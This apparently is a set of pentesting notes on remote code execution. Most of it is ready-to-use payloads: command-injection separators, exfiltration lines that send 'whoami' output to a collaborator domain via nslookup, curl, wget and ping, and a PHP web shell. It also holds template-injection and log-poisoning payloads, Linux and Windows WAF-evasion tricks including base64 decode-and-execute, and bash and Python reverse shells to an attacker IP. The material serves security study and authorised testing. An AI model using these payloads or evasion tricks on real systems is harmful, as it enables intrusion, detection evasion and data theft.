# Remote Code Execution (RCE) - Pentesting Notes

## Overview

Remote Code Execution vulnerabilities allow attackers to execute arbitrary commands on a target system. This guide covers exploitation techniques, bypasses, and exfiltration methods for ethical pentesting.

---

## Command Injection Fundamentals

### Command Separators

**Cross-Platform:**

- `;` - Separates commands sequentially (Unix only)
- `&` - Runs next command regardless of previous result
- `&&` - Runs next command only if previous succeeds
- `|` - Pipes output of first command to second
- `||` - Runs next command only if previous fails
- `\n` (newline) - Executes commands line by line (Unix only)

**Inline Execution (Unix):**

- Backticks: `` `whoami` ``
- Dollar parentheses: `$(whoami)`

### Injection Operators Reference

| Operator   | Character | URL-Encoded | Behavior                           |
| ---------- | --------- | ----------- | ---------------------------------- |
| Semicolon  | `;`       | `%3b`       | Both commands execute              |
| New Line   | `\n`      | `%0a`       | Both commands execute              |
| Background | `&`       | `%26`       | Both execute (second output first) |
| Pipe       | `         | `           | `%7c`                              |
| AND        | `&&`      | `%26%26`    | Both (only if first succeeds)      |
| OR         | `         |             | `                                  |
| Sub-Shell  | `` ` ` `` | `%60%60`    | Both (Linux only)                  |
| Sub-Shell  | `$()`     | `%24%28%29` | Both (Linux only)                  |

---

## Exploitation Techniques

### Basic Command Injection

```bash
# Simple injection examples
; whoami
&& whoami
| whoami
```

### Output Redirection

```bash
# Redirect to accessible file
whoami > output.txt
id > /tmp/output.txt
```

### Blind RCE Techniques

When command output isn't visible:

**DNS Exfiltration:**

```bash
nslookup $(whoami).collaborator-domain.com
```

**HTTP Exfiltration:**

```bash
curl http://collaborator-domain.com/?data=$(whoami)
wget http://collaborator-domain.com/$(whoami)
```

**ICMP (Ping):**

```bash
# Linux
ping -c 1 collaborator-domain.com

# Windows
ping -n 1 collaborator-domain.com

# Data exfiltration via ICMP
ping -p $(whoami | xxd -p) <attacker-ip>
```

---

## Advanced Exploitation Vectors

### File Upload RCE

Upload malicious files to achieve code execution:

**PHP Web Shell:**

```php
<?php system($_GET['cmd']); ?>
```

### Template Injection

Exploit templating engines:

```python
# Jinja2/Twig example
{{ self.__init__.__globals__['os'].popen('whoami').read() }}
```

### Server-Side Includes (SSI)

```html
<!--#exec cmd="whoami" -->
```

### Log Poisoning

Inject payloads into logs via HTTP headers or user input:

```php
<?php system('whoami'); ?>
```

### Deserialization Vulnerabilities

- Craft serialized payloads for RCE
- Tools: `ysoserial` (Java), `phpggc` (PHP)

---

## Filter & WAF Bypasses

### Linux/Unix Bypasses

#### Space Filtering

|Technique|Example|
|---|---|
|Tab character|`%09` or `\t`|
|IFS variable|`${IFS}` (not in sub-shells)|
|Brace expansion|`{ls,-la}`|

#### Character Substitution

|Technique|Result|Example|
|---|---|---|
|Path variable|`/`|`${PATH:0:1}`|
|LS_COLORS|`;`|`${LS_COLORS:10:1}`|
|Character shift|`\`|`$(tr '!-}' '"-~'<<<[)`|

#### Command Obfuscation

**Character Insertion:**

```bash
# Quotes (must be even number)
w'h'o'a'm'i
w"h"o"a"m"i

# Special variables (Linux)
who$@ami
who\ami
```

**Case Manipulation:**

```bash
# Execute regardless of case
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

**Reversed Commands:**

```bash
# Reverse string
echo 'whoami' | rev

# Execute reversed
$(rev<<<'imaohw')
```

**Base64 Encoding:**

```bash
# Encode
echo -n 'cat /etc/passwd | grep 33' | base64

# Decode and execute
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Shell Escape Sequences:**

```bash
bash -c $'whoami'
$(echo -e "whoami")
```

### Windows Bypasses

#### Space Filtering

|Technique|Example|Shell|
|---|---|---|
|Tab character|`%09`|Both|
|PROGRAMFILES|`%PROGRAMFILES:~10,-5%`|CMD|
|Environment var|`$env:PROGRAMFILES[10]`|PowerShell|

#### Character Substitution

|Technique|Result|Example|Shell|
|---|---|---|---|
|HOMEPATH|`\`|`%HOMEPATH:~0,-17%`|CMD|
|Environment var|`\`|`$env:HOMEPATH[0]`|PowerShell|

#### Command Obfuscation

**Character Insertion:**

```cmd
# Quotes (CMD & PowerShell)
w'h'o'a'm'i

# Caret (CMD only)
who^ami
```

**Case Manipulation:**

```powershell
# Windows is case-insensitive
WhoAmi
wHoAmI
```

**Reversed Commands:**

```powershell
# Reverse string
"whoami"[-1..-20] -join ''

# Execute reversed
iex "$('imaohw'[-1..-20] -join '')"
```

**Base64 Encoding:**

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### General Bypasses

**URL Encoding:**

```
%3B = ;
%0a = newline
%26 = &
```

**Double Encoding:**

```
%253B = ; (encoded twice)
```

**Unicode Encoding:**

```
\u0077\u0068\u006f\u0061\u006d\u0069 = whoami
```

**Null Byte Injection:**

```
whoami%00
```

**Alternative Command Paths:**

```bash
/bin/sh -c id
/usr/bin/id
```

---

## Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat Listener

```bash
nc -lvnp 4444
```

---

## Essential Tools

### Burp Suite

- **Burp Collaborator**: Capture out-of-band DNS/HTTP interactions
- **Intruder**: Automate payload testing
- **Repeater**: Manual request manipulation

### Command Line Tools

- **netcat**: Reverse shell listener
- **curl/wget**: HTTP exfiltration testing
- **nslookup/dig**: DNS exfiltration testing

### Environment Discovery

```bash
# Linux
printenv

# Windows CMD
set

# Windows PowerShell
Get-ChildItem Env:
```

---
